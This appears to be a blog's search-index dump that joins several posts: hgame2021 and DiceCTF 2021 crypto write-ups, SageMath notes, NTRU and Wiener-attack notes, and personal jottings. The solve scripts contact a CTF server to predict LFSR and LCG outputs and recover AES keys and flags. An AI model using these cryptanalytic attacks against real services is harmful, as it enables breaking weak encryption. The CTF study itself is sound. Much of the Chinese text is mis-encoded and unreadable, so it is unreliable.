{\u0026#39;iv\u0026#39;: \u0026#39;b4259ed79d050dabc7eab0c77590a6d0\u0026#39;, \u0026#39;encrypted_flag\u0026#39;: \u0026#39;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89\u0026#39;} Million: å†è§ä¼™æ± Switch: å†è§ Liki: ????? åŠ æ³•ç¾¤çš„å¹‚æ˜¯ä¹˜æ³•\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto.Util.number import long_to_bytes import hashlib import gmpy2 as gp from binascii import a2b_hex A = 6407001517522031755461029087358686699246016691953286745456203144289666065160284103094131027888246726980488732095429549592118968601737506427099198442788626223019135982124788211819831979642738635150279126917220901861977041911299607913392143290015904211117118451848822390856596017775995010697100627886929406512483565105588306151304249791558742229557096175320767054998573953728418896571838697779621641522372719890056962681223595931519174265357487072296679757688238385898442549594049002467756836225770565740860731932911280385359763772064721179733418453824127593878917184915316616399071722555609838785743384947882543058635 B = 5522084830673448802472379641008428434072040852768290130448235845195771339187395942646105104638930576247008845820145438300060808178610210847444428530002142556272450436372497461222761977462182452947513887074829637667167313239798703720635138224358712513217604569884276513251617003838008296082768599917178457307640326380587295666291524388123169244965414927588882003753247085026455845320527874258783530744522455308596065597902210653744845305271468086224187208396213207085588031362747352905905343508092625379341493584570041786625506585600322965052668481899375651376670219908567608009443985857358126335247278232020255467723 p = 30567260905179651419358486099834315837354102714690253338851161207042846254351374572818884286661092938876675032728700590336029243619773064402923830209873155153338320502164587381848849791304214084993139233581072431814555885408821184652544361671134564827265516331283076223247829980225591857643487356406284913560960657053777612115591241983729716542192518684003840806442329098770424504275465756739925434019460351138273272559738332984560095465809481270198689251655392941966835733947437503158486731906649716026200661065054914445245468517406404904444261196826370252359102324767986314473183183059212009545789665906197844518119 g = 12602983924735419868428783329859102652072837431735895060811258460532600319539509800915989811879506790207025505003183121812480524033163157114086741486989697 x1 = gp.invert(g,p)*A%p x2 = gp.invert(g,p)*B%p key1 = x1*x2*g%p shared_secret = key1 sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(\u0026#39;ascii\u0026#39;)) key = sha1.digest()[:16] iv1 = a2b_hex(\u0026#39;d3811beb5cd2a4e1e778207ab541082b\u0026#39;) iv2= a2b_hex(\u0026#39;b4259ed79d050dabc7eab0c77590a6d0\u0026#39;) data1 = a2b_hex(\u0026#39;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092\u0026#39;) data2 = a2b_hex(\u0026#39;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89\u0026#39;) decrypt1 = AES.new(key,AES.MODE_CBC,iv1) decrypt2 = AES.new(key,AES.MODE_CBC,iv2) flag1 = decrypt1.decrypt(data1) flag2 = decrypt2.decrypt(data2) print(flag1,flag2) # hgame{AdD!tiVe-Gr0up~DH_K3y+eXch@nge^4nd=A3S} å¤ºå®å¤§å†’é™©2 # lfsråŸºç¡€\nfrom icecream import * from pwn import * # nc 30607 sh = remote(\u0026#39;182.92.108.71\u0026#39;, 30607) ans = [] for i in range(10): buf = sh.recvuntil(\u0026#39;guess:\u0026#39;) sh.sendline(\u0026#39;-1\u0026#39;) sh.recvuntil(\u0026#39;Wrong, the secret is \u0026#39;) buf = int(sh.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) # print(buf) ans.append(buf) print(ans) bstr = \u0026#39;\u0026#39; for i in ans: ic(i, bin(i)[2:].rjust(4, \u0026#39;0\u0026#39;)) bstr += bin(i)[2:].rjust(4, \u0026#39;0\u0026#39;) s = bstr ic(bstr,len(s)) init = int(bstr[:40],2) ic(init) class LXFIQNN(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 def next(self): nextdata = (self.init \u0026lt;\u0026lt; 1) \u0026amp; self.lengthmask i = self.init \u0026amp; self.mask \u0026amp; self.lengthmask output = 0 while i != 0: output ^= (i \u0026amp; 1) i = i \u0026gt;\u0026gt; 1 nextdata ^= output self.init = nextdata return output def random(self, nbit): output = 0 for _ in range(nbit): output \u0026lt;\u0026lt;= 1 output |= self.next() return output prng = LXFIQNN(init, 0b1011001010001010000100001000111011110101, 40) for i in range(81): secret = prng.random(4) sh.sendline(str(secret)) print(sh.recvuntil(\u0026#39;guess\u0026#39;)) sh.interactive() #hgame{lfsr_121a111y^use-in\u0026amp;crypto} å¤ºå®å¤§å†’é™©1 # ä¿è¯$a\u0026lt;c,b\u0026lt;c,a,b,cäº’è´¨$,task1,2 å¾ˆå®¹æ˜“æ±‚å‡ºæ¥\ntask3ç”¨é€‰æ‹©æ˜æ–‡æ˜¯æ€æƒ³å…ˆæŠŠa,bæ¶ˆæ‰,å¯¹tmp1,tmp2å–æœ€å¤§å…¬å› æ•°,å¹³å‡è·‘50æ¬¡ç”±ä¸€ç»„é€‚åˆæˆ‘ä»¬è¿™ä¸ªç®—æ³•çš„a,b,c\nfrom icecream import * from libnum import * from pwn import * # print(sh.recvline()) def t1(sh): s = sh.recvline().decode() ic(s) s =s.split(\u0026#39;,\u0026#39;) print(((s[0][1:]), (s[1][:-1]))) a,c = (int(s[0][1:]),int(s[1][:-2])) m1 = int(sh.recvline()) m2 = int(sh.recvline()) b = (m2-a*m1)%c # ic(b,int(sh.recvline())) # ic(b) sh.sendline(str(b)) def t2(sh): c = int(sh.recvline()) m = [0]+[int(sh.recvline()) for i in range(3)] a = (m[2]-m[3])*(invmod(m[1]-m[2],c)) a %= c b = m[2]-a*m[1] b %= c # ic(a, sh.recvline()) # ic(b, sh.recvline()) # ic(a,b) sh.sendline(str(a)) sh.sendline(str(b)) def t3(sh): m = [123]+[int(sh.recvline()) for i in range(7)] ic(m, len(m)) # tmp1 = -(m[7]-m[6])*(m[5]-m[4])-(m[6]-m[5])*(m[6]-m[5]) tmp1 = abs((m[4]-m[3])*(m[2]-m[1])-(m[3]-m[2])*(m[3]-m[2])) tmp2 = abs((m[7]-m[6])*(m[5]-m[4])-(m[6]-m[5])*(m[6]-m[5])) ic(tmp1, tmp2) tmp = gcd(tmp1, tmp2) # ic(tmp, int(sh.recvline())) # ic(tmp) sh.sendline(str(tmp)) # print(tmp1 % .cgen, tmp2 % gen.c) # nc 182.92.108.71 30641 def main(): tot =0 while 1: tot+=1 try: sh = remote(\u0026#39;182.92.108.71\u0026#39;, 30641) t1(sh) t2(sh) t3(sh) buf = (sh.recvall()) print(buf) if b\u0026#39;win\u0026#39; in buf: print(f\u0026#39;try {tot} times\u0026#39;) break except: pass if __name__ == \u0026#39;__main__\u0026#39;: main() \u0026#39;\u0026#39;\u0026#39; [+] Receiving all data: Done (56B) [*] Closed connection to 182.92.108.71 port 30641 b\u0026#39;win\\nhgame{Cracking^prng_Linear)Congruential\u0026amp;Generators}\\n\u0026#39; try 46 times \u0026#39;\u0026#39;\u0026#39; ","date":"26 February 2021","permalink":"/achieve/ctf/hgame2021/","section":"archive","summary":"","title":"hgame2021 å¯†ç å­¦ writeup"},{"content":"[toc]\ngarbled # è¿™ä¸ªæœ‰æ„æ€äº†\næ–‡ä»¶é‡Œé¢ç»™äº†ä¸€å †æ–‡ä»¶ï¼Œå¹¶æœ‰ä¸€ä¸ªç¤ºä¾‹æ–‡ä»¶å’Œflagè·å–æ–‡ä»¶æ¥è°ƒç”¨æ•´ä¸ªåŠ å¯†ç”µè·¯\nfrom generate_garbled_circuit import g_tables, keys\nåˆ†æä¸€éæ•°æ®ç”Ÿæˆæµç¨‹\nç”Ÿæˆäº†7ç»„keyï¼Œæ¯ç»„ä¸¤ä¸ªå…ƒç´ ä¸º keyi0ï¼Œkeyi1 æ¯ä¸ªå…ƒç´ çš„å°äº2**24 å°†7ç»„æ•°æ®æŒ‰ç…§â€œé—¨â€çš„æŒ‡å¼•å¾—åˆ° 3 ç»„åŠ å¯†åçš„ table æ¯ç»„4è¡Œæ²¡è¡Œä¸¤ä¸ªå…ƒç´ ä»å·¦åˆ°å³åˆ†åˆ«ä¸º glï¼Œv å…·ä½“æµç¨‹å¦‚ä¸‹ï¼Œä»¥ç¬¬1ç»„tableç”Ÿæˆçš„æƒ…å†µç¤ºä¾‹ï¼š\ninput : key1,key2,key5 # g_tables é’Ÿå…ƒç´ çš„é¡ºåº g_tables = {5: [(g1, v1), (g2, v2), (g3, v3), (g4, v4)], g1 = enc(key5_0,(key1_0,key2_0)) g2 = enc(key5_0,(key1_0,key2_1)) g3 = enc(key5_0,(key1_1,key2_0)) g4 = enc(key5_1,(key1_1,key2_1)) v1 = enc(0,(key1_0,key2_0)) v2 = enc(0,(key1_0,key2_1)) v3 = enc(0,(key1_1,key2_0)) v4 = enc(0,(key1_1,key2_1)) åˆ†æè°ƒç”¨ç”µè·¯ç”Ÿæˆinputçš„ä»£ç å‘ç°inputçš„4ä¸ªå…ƒç´ ä¸º $key_{11},key_{21},key_{31},key_{41}$\nevaluate_circuit å¯¹ g_tableså†…å®¹è¿›è¡Œè§£å¯†ï¼Œæ¢å¤å‡º $key_{51},key_{61},key_{71}$\nä»¥ç¬¬ä¸€ç»„ g_tables å³ key1ï¼Œkey2ï¼Œkey5ä¸ºä¾‹\nkey5_1 = dec(g1, (key1_1, key2_1)) 0 = dec(v1, (key1_1, key2_1)) def dec(data, key1, key2): decrypted = decrypt_data(data, key2) decrypted = decrypt_data(decrypted, key1) return decrypted é€šè¿‡key1_1~4_1å¯ä»¥æ¢å¤å‡ºæ‰€æœ‰keyi_1\nä½ é—®æˆ‘ä¸ºä»€ä¹ˆä¸æ¢å¤å‡ºæ‰€æœ‰keyï¼Ÿ\nè¿™å°±æ¶‰åŠåˆ°GarbledCircuitè®¾è®¡åˆè¡·äº† å’•å’•å’•\nå¯¹è§£å¯†çš„åœºæ™¯å¯ä»¥æ‰©å±•å‡ºè¿™æ ·çš„å¼å­\n0 = dec(v1, (key1_0, key2_0)) 0 = dec(v2, (key1_0, key2_1)) 0 = dec(v3, (key1_1, key2_0)) 0 = dec(v4, (key1_1, key2_1)) æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•æ‰¾å‡ºæ‰€æœ‰çš„key1,key2å¼€ç¼©å°èŒƒå›´ï¼Œä½†2**48çš„å¤æ‚åº¦æ˜¯æˆ‘ä»¬ä¸æ„¿æ„çœ‹åˆ°çš„ï¼Œè¿™é‡Œç”¨ä¸­é—´ç›¸é‡æ”»å‡»çš„æ€æƒ³å°†å¤æ‚åº¦é™åˆ°$O(2\\times2^{24})$,è¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ¥å—çš„èŒƒå›´\nç°åœ¨ï¼Œæˆ‘ä»¬å¾—åˆ°äº†æ‰€æœ‰æ»¡è¶³ä¸‹å¼æˆç«‹çš„keyï¼Œéœ€è¦æˆ‘ä»¬æƒ³åŠæ³•å‡†ç¡®çš„å®šä½åœ°å®šä½åˆ° key1_1, key2_1\n0 = dec(v1, (key1_0, key2_0)) 0 = dec(v2, (key1_0, key2_1)) 0 = dec(v3, (key1_1, key2_0)) 0 = dec(v4, (key1_1, key2_1)) ç”±æ•°æ®ç”Ÿæˆçš„ä»£ç æˆ‘ä»¬å¯çŸ¥ï¼š\nkey5_0 = dec(g1, (key1_0, key2_0)) key5_0 = dec(g2, (key1_0, key2_1)) key5_0 = dec(g3, (key1_1, key2_0)) key5_1 = dec(g4, (key1_1, key2_1)) $algorithm1$\n$$ assume (k11,k21)is\\;global\\;keys\\\\\\\\ there\\;must\\;exist\\;\\\\\\\\ (k10,k21)\\\\\\\\ (k11,k20)\\\\\\\\ (k10,k20)\\\\\\\\ dec(g1, (key1\\_0, key2\\_0))= dec(g2, (key1\\_0, key2\\_1))= dec(g3, (key1\\_1, key2\\_0)) $$ ç»¼ä¸Šï¼Œå¯ä»¥å¾—åˆ° key1_1, key2_1 çš„å‡†ç¡®å€¼\nplagiarism # algorithmï¼š\nSo we have two ciphertexts:\nC1 = P1e mod(N)\nC2 = P2e mod(N)\nwhere second text is simply first with known difference:\nP2 = P1+Î´\nso we have after substitution:\nf = P1e mod(N) - C1\ng = (P1+Î´)e mod(N) - C2\nCalculating GCD(f,g) will give us common dividor a * P1 + b so P1 = -bâ„a.\nsage å¤šé¡¹å¼ç¯ç®— gcd\nR = PolynomialRing(Zmod(n), \u0026#39;X\u0026#39;) X = R.gen() f1 = (X)**e - c1 f2 = (X + delta)**e - c2 r = gcd(f1, f2) def hgcd(a0,a1): if a1.degree() \u0026lt;= (a0.degree()//2): return np.array([[1,0],[0,1]]) m = a0.degree()//2 X = a0.variables()[0] b0 = a0 // X**m b1 = a1 // X**m R = hgcd(b0,b1) [d,e] = (R.dot(np.array([a0,a1]).transpose())).transpose() ff = d % e m = m // 2 g0 = e // X**m g1 = ff // X**m S = hgcd(g0,g1) q = d // e return S.dot(np.array([[0,1],[1,-q]])).dot(R) def gcd(a0,a1): while True: print(a0.degree(), end=\u0026#34;, \u0026#34;, flush=True) if a0 % a1 == 0: return a1 if a0.degree() == a1.degree(): a1 = a0%a1 #print(a0.degree()) R = hgcd(a0,a1) [b0,b1] = R.dot(np.array([a0,a1]).transpose()).transpose() if b0%b1==0: return b1 c = b0 % b1 a0 = b1 a1 = c ","date":"23 February 2021","permalink":"/achieve/ctf/dicectf2021/","section":"archive","summary":"","title":"dicectf2021"},{"content":"[toc]\nä¸€å¹´è¿‡å»äº†å‘¢,ç¨å¾®è®°ä¸€ä¸‹è¿™ä¸€å¹´åˆ°å¤´éƒ½å¹²äº†äº›ä»€ä¹ˆäº‹å§\nå›å®¶åå¿ƒæƒ…è«åå˜å¥½äº†\nä¸ç®¡æ€ä¹ˆè¯´åˆæˆåŠŸæ— ä¼¤æ··äº†ä¸€å­¦æœŸå‘¢(ï¿£yâ–½,ï¿£)â•­\nä¸åˆ†å…ˆåéšç¼˜æ’åº\n2021 # ä¸œé«˜è”è·¨å¹´\næŠ“ä½æœ€åä¸€ç‚¹è½æ—¥\nå¤é•‡\næ”¾å‡å‰ä¸€å¤©\nå­¦æ ¡çš„å®¶åº•\næ‘¸é»‘å¹²é¥­ å–äº†å‘³é“ä¸å’‹åœ°çš„æ´‹é…’\nä¸‹åŠå¹´ # å®£è®²\nå·å¤§\nä¸‹é›ªäº†\nä¹Œè‹è¿˜å¯ä»¥\nå›åˆ°è€å·¢\nå—äº¬ # ç§¦æ·®æ²³\nå—é‚®è¾¹ä¸Šçš„é‚£å•¥æ¹–\nåŒ—äº¬ # æ˜é•¿åŸ\nç‹¬å…·ç‰¹è‰²çš„åœ°é“ç«™\nè¿˜è¡Œï¼Œäººä¸æ˜¯ç‰¹åˆ«å¤š\nä¸‹ç«è½¦\nä¼ ç»Ÿè‰ºèƒ½æ·±å¤œä¾¿åˆ©åº—\nå¤©æ´¥ # å¿ä¸Šçš„ç»¿çš®ç«è½¦ç«™\nä¾¿åˆ©åº—ä¼ ç»Ÿè‰ºèƒ½\nä¸ŠåŠå¹´ # æŠ˜è…¾åŒç³»ç»Ÿ\næˆåŠŸè“å±\nå®½çª„å··å­\n","date":"23 February 2021","permalink":"/achieve/loving-2020/","section":"archive","summary":"[toc]","title":"loving-2020"},{"content":"","date":"23 February 2021","permalink":"/categories/notes/","section":"Categories","summary":"","title":"notes"},{"content":"[toc]\nSR.var(\u0026#39;x\u0026#39;,10) åˆ›å»º xæ•°ç»„[0~9] # the same command works also with SR.var(\u0026#39;a, b, c, x\u0026#39; a, b, c, x = var(\u0026#39;a, b, c, x\u0026#39;) a, x = var(\u0026#39;a, x\u0026#39;) expr = cos(x+a) * (x+1) expr (x+1)cos(a+x) expr.subs(a == -x) x+1 expr.subs(x == pi, a == pi) 5cos(8) substitute/subs æ·»åŠ æ¡ä»¶ n = var(\u0026#39;n\u0026#39;) assume(n, \u0026#39;integer\u0026#39;) ä¸å¦¨è®¾ n ä¸ºæ•´æ•° sin(n * pi) 0 assume(n \u0026gt; 0) assumptions()å°†æ‰€æœ‰ç°å­˜çš„å‡è®¾ä½œä¸ºæ¡ä»¶è¾“å‡º [n is integer, n \u0026gt; 0] forget() é—å¿˜æ‰€æœ‰å‡è®¾ Sageè¿˜æ˜¯ç®€åŒ–ç¬¦å·è¡¨è¾¾å¼çš„å¼ºå¤§å·¥å…·ã€‚ # f=(x^2-1) / (x+1) # (x^2 - 1)/(x + 1) æœªçŸ¥æ•°f æ‹¥æœ‰è¿™äº›ç¬¦å·å˜é‡ ç”Ÿæˆå¸¸è§„eccæ›²çº¿ # In Sage, an elliptic curve is always specified by (the coefficients of) a long Weierstrass equation\n$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$\nparameter2ï¼šEllipticCurve(pï¼Œ[a1,a2,a3,a4,a6])\n25519\nE = EllipticCurve(GF(2^255 - 19), [0, 486662, 0, 1, 0]) p = E.order()\t# æ±‚é˜¶ ZmodP = Zmod(p) #æ„å»ºç¯ G = E.lift_x(9) # xä¸º9çš„ç‚¹ *ctf ecc\n_F=GF(2**100) _G = (_F.fetch_int(698546134536218110797266045394),_F.fetch_int(1234575357354908313123830206394)) _P = (_F.fetch_int(403494114976379491717836688842), _F.fetch_int(915160228101530700618267188624)) E = EllipticCurve(GF(2**100), [1, 2, 0, 0, 3]) # å¸¸è§„ç‚¹è½¬ä¸ºeccç‚¹ G = E(G) P = E(P) å¤šé¡¹å¼ç¯ # R = PolynomialRing(Zmod(n), \u0026#39;X\u0026#39;) X = R.gen() f1 = (X)**e - c1 f2 = (X + delta)**e - c2 return sympy.nextPrime((B!)%A) è§£æ–¹ç¨‹ # var(\u0026#39;x\u0026#39;) sol = solve([x^2 - p_q*x + N == 0], [x]) print(sol) # sagemathä¼šè¿”å›ç®—å¼ small_roots # PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) f = p0 + x f = f.monic() roots = f.small_roots(X=2^430, beta=0.4) if roots: p = p0 + roots[0] print(p) ","date":"23 February 2021","permalink":"/achieve/2019to2021/sagemath%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/","section":"archive","summary":"\u003cp\u003e[toc]\u003c/p\u003e","title":"sagemathå…¥é—¨ç¬”è®°.md"},{"content":"[toc]\nè¿™å‡ å¤©å†™ginçš„ä¸€äº›ä¸œè¥¿ # ç™»å½• # getå¾—åˆ°htmlç•Œé¢\npostï¼š\nginæ¥å—htmlè¡¨å•ä¼ å›çš„postæ•°æ®\nhtmlçš„jsæ¥æ”¶ginä¼ å›çš„jsonå®ç°å‰åç«¯ç®€å•çš„äº¤äº’\nç™»å½•æµç¨‹\næ£€æµ‹cookieæ˜¯å¦å·²ç»ç™»å½• æ£€æµ‹ç”¨æˆ·åæ˜¯éä¸ºç©º æ£€æµ‹æ•°æ®åº“ä¸­æ˜¯éæœ‰æ”¹ç”¨æˆ·å æ£€æµ‹å¯†ç  æ³¨å†Œ # æ³¨å†Œæµç¨‹\næ£€æµ‹cookie æ£€æµ‹æ˜¯éä¸ºç©º æ£€æµ‹æ•°æ®åº“æ˜¯éæœ‰å¯¹åº”é‚®ç®± æ³¨å†ŒæˆåŠŸ åæœŸåŠ ä¸Šé‚®ç®±æ ¼å¼éªŒè¯ï¼ˆ\ncookie # setUserCookie # å°†è¯¥userçš„ç»“æ„ä½“jsonåŒ–ä¼ å›\nlogout # æ¸…é™¤usercookie\n","date":"23 February 2021","permalink":"/achieve/2019to2021/gin%E7%AC%94%E8%AE%B0/","section":"archive","summary":"[toc]","title":"ginç¬”è®°.md"},{"content":"[toc]\nsm2 # SM2æ˜¯\rå›½å®¶å¯†ç ç®¡ç†å±€äº2010å¹´12æœˆ17æ—¥å‘å¸ƒçš„æ¤­åœ†æ›²çº¿å…¬é’¥å¯†ç ç®—æ³•ã€‚\neccå›é¡¾ # é€‰å–æ›²çº¿ Ep(a,b) Aliceå– åŸºç‚¹Gå’Œç§é’¥k,è®¡ç®—å…¬é’¥ pubk.ä¼ pubkå’ŒGç»™bob bobè®¡ç®— C1=M+rKï¼›C2=rGä¼ ç»™alice Aæ¥åˆ°ä¿¡æ¯åï¼Œè®¡ç®—C1-kC2ï¼Œç»“æœå°±æ˜¯ç‚¹M æè¿°ä¸€æ¡Fpä¸Šçš„æ¤­åœ†æ›²çº¿ï¼Œå¸¸ç”¨åˆ°å…­ä¸ªå‚é‡ï¼šT=(p,a,b,G,n,h)\np a bç”¨æ¥ç¡®å®šæ›²çº¿\nGä¸ºåŸºç‚¹ï¼Œnä¸ºç‚¹Gçš„é˜¶ï¼Œh æ˜¯æ¤­åœ†æ›²çº¿ä¸Šæ‰€æœ‰ç‚¹çš„ä¸ªæ•°mä¸næ•´é™¤\nçˆ±å¾·åæ›²çº¿ç®€ä»‹ # å½¢å¦‚\n$x^2+y^2=1-d\\cdot x^2 \\cdot y^2$\nåŠ æ³• # p1+p2\n2*p\né€†å…ƒ\nï¼ˆxï¼Œyï¼‰-\u0026gt;(-x,y)\né›¶å…ƒ\nï¼ˆ0ï¼Œ1ï¼‰\nçˆ±å¾·åæ›²çº¿è¿ç®—çš„å‡ ä½•æ„ä¹‰ # å…ˆè€ƒè™‘å¸¸è§„åœ†\nå…ˆå»ºç«‹ä¸€ä¸ªä½†ä¸ºè¿œ$x^2+y^2=1$\nè€ƒè™‘ä¸€ä¸ªçˆ±å¾·åå•ä½æ›²çº¿\nå¸¸è§„çˆ±å¾·åæ›²çº¿åŸºæœ¬æ€§è´¨å°±è¿™äº›äº†\nè’™å“¥é©¬åˆ©æ›²çº¿ Ed25519 ç­¾å # è’™å“¥é©¬åˆ©æ›²çº¿ï¼ˆMontgomery curveï¼‰æ˜¯å¦ä¸€ç§å½¢å¼çš„æ¤­åœ†æ›²çº¿\nå¸¸è§„ecc\n$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$\nè’™å“¥é©¬åˆ©æ›²çº¿\n$By^2=x^3+Ax^2+x$\n","date":"23 February 2021","permalink":"/achieve/2019to2021/%E7%88%B1%E5%BE%B7%E5%8D%8E%E6%9B%B2%E7%BA%BF-%E8%92%99%E5%93%A5%E9%A9%AC%E5%88%A9/","section":"archive","summary":"[toc]","title":"çˆ±å¾·åæ›²çº¿-è’™å“¥é©¬åˆ©.md"},{"content":"[toc]\ntiming attack # æ—¶åºæ”»å‡»å±äºä¾§ä¿¡é“æ”»å‡»/æ—è·¯æ”»å‡»\næ¯”å¦‚åŠ è§£å¯†çš„é€Ÿåº¦/åŠ è§£å¯†æ—¶èŠ¯ç‰‡å¼•è„šçš„ç”µå‹/å¯†æ–‡ä¼ è¾“çš„æµé‡å’Œé€”å¾„ç­‰è¿›è¡Œæ”»å‡»çš„æ–¹å¼ï¼Œä¸€ä¸ªè¯å½¢å®¹å°±æ˜¯â€œæ—æ•²ä¾§å‡»â€ã€‚\næŸä¸ªå‡½æ•°è´Ÿè´£æ¯”è¾ƒç”¨æˆ·è¾“å…¥çš„å¯†ç å’Œå­˜æ”¾åœ¨ç³»ç»Ÿå†…å¯†ç æ˜¯å¦ç›¸åŒï¼Œå¦‚æœè¯¥å‡½æ•°æ˜¯ä»ç¬¬ä¸€ä½å¼€å§‹æ¯”è¾ƒï¼Œå‘ç°ä¸åŒå°±ç«‹å³è¿”å›ï¼Œé‚£ä¹ˆé€šè¿‡è®¡ç®—è¿”å›çš„é€Ÿåº¦å°±çŸ¥é“äº†å¤§æ¦‚æ˜¯å“ªä¸€ä½å¼€å§‹ä¸åŒçš„\ncenter-lifts ?\nntruå¯†ç ç®—æ³• # é€‰å– n p q d\nn = 109 q = 2048 p = 3 q \u0026gt; (6d+1)p\nä¸ºå…¬å¼€å‚æ•°\nq æœ€å¥½ä¸º2çš„å¹‚,ä¸èƒ½ä¸º3çš„å€æ•°\nå–å¤šé¡¹å¼ f g\nprikey\nf fq*f = 1 mod q g pubkey $$ h \\equiv pg*f_{q};mod;q $$\nenc # å–éšæœºæ•° r,msgå¤šé¡¹å¼åŒ–ä¸ºm\nc = rh+m mod q\ndec # a = f*c= f (rh +m )=fprh + fm = f *r *pg fq mod q\na = rpg + m mod q\nm = a mod p\næ”»å‡»å®ä¾‹ # This attack breaks NTRU with n = 7, d = 5, q = 256.\ndef convolution(f, g): return (f * g) % (x ^ n-1) Zx.\u0026lt;x\u0026gt; = ZZ[] n = 7 d = 5 q = 256 h=-82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5 h3 = ((171)*h) % q # lift(1/Integers(q)(p)) * h M = matrix(2*n) for i in range(n): M[i,i] = q for i in range(n,2*n): M[i,i] = 1 for i in range(n): for j in range(n): M[i+n,j] = convolution(h3,x^i)[j] print(M) print(M.LLL()[0]) ","date":"22 February 2021","permalink":"/achieve/2019to2021/ntru%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/","section":"archive","summary":"[toc]","title":"ntruå¯†ç ç®—æ³•.md"},{"content":"[toc]\nwinner poorf # $$ \\begin{aligned} \u0026N = q\\times p\\\\ \u0026\\phi(n)=(p-1)\\times (q-1)\\\\ \u0026phi(n)\\approx n\\\\ \u0026ed =1 +k\\phi(n)\\\\ \u0026åŒé™¤d\\phi(n)å¾—\\\\ \u0026\\frac{e}{\\phi(n)}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}\\\\ \u0026å› ä¸º \\phi(n)\\approx\\;n\\\\ \u0026\\frac{e}{N}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}å¾—åˆ°\\frac{k}{d}çš„è¿‘ä¼¼å€¼\\\\ \u0026åˆ©ç”¨æ±‚æ ¹å…¬å¼æˆ–è€…ä»¥ä¸‹æ­¥éª¤éªŒè¯\\\\ \u0026ed=k(p-1)(q-1)+1\\\\ \u0026[\\frac{ed}{k}]=(p-1)(q-1)\\\\ \u0026\\frac{pq-(p-1)(q-1)1+1}{2}=\\frac{p+q}{2}\\\\ \u0026(\\frac{p+q}{2})^2-pq=(\\frac{p-q}{2})^2 \\end{aligned} $$ from sage.all import continued_fraction, Integer def wiener(e, n): m = 12345 c = pow(m, e, n) list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: d = int(i.denominator()) # åˆ†æ¯ m1 = pow(c, d, n) if m1 == m: return d n, e = pubkey print wiener(e, n) $\\frac{e}{N}=\\frac{1}{d\\phi(n)}+\\frac{k}{d}å¾—åˆ°\\frac{k}{d}$\nçš„è¿‘ä¼¼å€¼åsagemathå¯ä»¥è‡ªè¡Œè¾“å‡ºåˆ†å­åˆ†æ¯\nweird x-unca # eçš„å–å€¼èŒƒå›´ä¸ºï¼š\n$$ \\begin{equation}\\begin{split} \u0026e = \\frac{y}{x} \\cdot ((p+1)(q+1) \\pm \\frac{(p-q)\\cdot N^{0.21}}{3(p+q)})\\\\ \u0026\\frac{e}{n}=\\frac{y}{x}(1+\\frac{p+q+1}{n}\\pm\\frac{p-q}{3(p+q)N^{0.79}})\\\\ \u0026çº¦ç­‰äº\\frac{e}{n}=\\frac{y}{x}+0 \\end{split}\\end{equation} $$ x = getrandbits(512) y = getrandbits(512) for yx in continued_fraction(e/N).convergents(): y = yx.numerator() x = yx.denominator() if 505 \u0026lt; int(y).bit_length() \u0026lt; 512: print(y, x) ASIS Finals CTF 2017- Gracias Writeup # paper\nAndrej Dujellaè¯´åˆ†æ¯ä¸ä»…å¯ä»¥å¾—åˆ°dï¼Œdè¿˜å¯ä»¥å†™æˆ$d=tqi+sq_{i-1}$\nqiä¸ºç¬¬iæ¬¡çš„åˆ†æ¯\nfrom sage.all import continued_fraction, Integer from Crypto.Util.number import * def wiener(e, n): m = 12345 c = pow(m, e, n) q0 = 1 list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: k = i.numerator() # åˆ†å­ qi = i.denominator() # åˆ†æ¯ for r in range(20): for s in range(20): d = r*qi + s*qi_1 m1 = pow(c, d, n) if m1 == m: return d qi_1 = qi n, e = pubkey c1, c2 = c d = wiener(e, n) è¥¿æ¹–è®ºå‰‘-2020-Wake me up until May ends-task # limit1 = (3 * n) // (2 * (int(iroot(n, 4)[0]) + 3 * (p + q))) x * y \u0026lt; limit1 limit2 = (abs(p-q) * int(iroot(n, 4)[0]) * y) // (6 * (max(p, q))) z = e * x - y * _phi abs(z) \u0026lt; limit2 limit1 $xy\u0026lt;\\frac{3n}{2n^{\\frac{1}{4}}+3(p+q)}$\nlimit2 (assume q\u0026gt;p) $z=ex-y\\phi(n)\u0026gt;\\frac{(p-q)n^{\\frac{1}{4}}y}{6q}$ ç”±äºeæ˜¯ä¸€ä¸ªä¸€ä¸ªå‡ä¸‹å»çš„ï¼Œå¯ä»¥è¿‘ä¼¼çœ‹ä¸ºç­‰å·\n$e = (\\frac{(p-q)n^{\\frac{1}{4}}}{6q}+\\phi(n))\\frac{y}{x}$ $\\frac{e}{n} = (\\frac{(p-q)n^{\\frac{1}{4}}}{6qn}+\\frac{\\phi(n)}{n})\\frac{y}{x}\\approx\\frac{y}{x}$\n","date":"22 February 2021","permalink":"/achieve/2019to2021/%E8%BF%9E%E5%88%86%E6%95%B0%E4%BB%A3%E7%A0%81/","section":"archive","summary":"[toc]","title":"è¿åˆ†æ•°ä»£ç .md"},{"content":"\rå®‰å…¨å¤šæ–¹è®¡ç®— # å¾ˆé‡è¦çš„è€ä¸œè¥¿äº†ï¼Œä½†åº”ç”¨èŒƒå›´æå…¶å¹¿æ³›ï¼Œä½œä¸ºç§‘æ™®å­¦ä¹ ä¸€ä¸‹è›®å¥½çš„\nå®‰å…¨çš„åˆ†å¸ƒå¼è®¡ç®— MPC (Secure multi-party computation)æŒ‡çš„æ˜¯ç”¨æˆ·åœ¨æ— 